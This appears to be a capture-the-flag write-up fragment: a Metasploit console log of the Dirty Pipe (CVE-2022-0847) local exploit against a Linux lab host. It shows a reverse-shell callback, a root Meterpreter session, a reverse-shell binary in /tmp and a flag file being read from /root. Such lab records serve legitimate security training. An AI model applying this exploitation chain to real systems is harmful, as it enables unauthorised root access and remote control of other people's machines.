![[Pasted image 20240530104544.png]]

```bash
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run

[*] Started reverse TCP handler on 10.10.14.39:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
[*] Executing exploit '/tmp/.saebtn /bin/passwd'
[*] Sending stage (3045380 bytes) to 10.10.110.10
[+] Deleted /tmp/.saebtn
[*] Meterpreter session 2 opened (10.10.14.39:5555 -> 10.10.110.10:48386) at 2024-05-30 14:34:23 +0000

meterpreter >  getuid
Server username: root
meterpreter > ls
Listing: /tmp
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
041777/rwxrwxrwx  4096  dir   2024-05-30 12:04:33 +0000  .ICE-unix
041777/rwxrwxrwx  4096  dir   2024-05-30 12:04:33 +0000  .Test-unix
041777/rwxrwxrwx  4096  dir   2024-05-30 12:04:33 +0000  .X11-unix
041777/rwxrwxrwx  4096  dir   2024-05-30 12:04:33 +0000  .XIM-unix
041777/rwxrwxrwx  4096  dir   2024-05-30 12:04:33 +0000  .font-unix
100755/rwxr-xr-x  250   fil   2024-05-30 14:27:42 +0000  rev.elf
040700/rwx------  4096  dir   2024-05-30 12:04:34 +0000  systemd-private-8ea379e7e07b4823b35e6c6a300a4cdb-systemd-logind.service-7vMuqf
040700/rwx------  4096  dir   2024-05-30 12:04:33 +0000  systemd-private-8ea379e7e07b4823b35e6c6a300a4cdb-systemd-timesyncd.service-csDQdf
040700/rwx------  4096  dir   2024-05-30 12:04:34 +0000  vmware-root_290-868982980

meterpreter > shell
Process 1081 created.
Channel 1 created.

ls
rev.elf
systemd-private-8ea379e7e07b4823b35e6c6a300a4cdb-systemd-logind.service-7vMuqf
systemd-private-8ea379e7e07b4823b35e6c6a300a4cdb-systemd-timesyncd.service-csDQdf
vmware-root_290-868982980
pwd
/tmp
cd /root
ls
flag.txt
cat flag.txt
GENESIS{the_best_s0rt_of_beef}
```

![[Pasted image 20240530104702.png]]